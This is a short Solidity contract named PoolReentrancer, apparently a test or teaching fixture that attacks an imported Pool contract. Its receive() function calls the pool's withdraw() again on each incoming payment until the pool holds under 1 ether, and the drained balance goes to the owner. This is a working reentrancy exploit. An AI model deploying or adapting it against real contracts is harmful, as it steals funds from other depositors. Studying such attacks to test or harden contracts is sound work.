// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import "./Pool.sol";

contract PoolReentrancer {
  address private owner;
  Pool private pool;

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  constructor (address _owner, address _pool) {
    owner = _owner;
    pool = Pool(_pool);
  }

  function invest() external payable {
    pool.invest{value: msg.value}();
  }

  function withdraw() external {
    pool.withdraw();
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    if (msg.sender == address(pool)) {
      if (msg.sender.balance >= 1 ether) {
        Pool(msg.sender).withdraw();
      }
    }
  }
}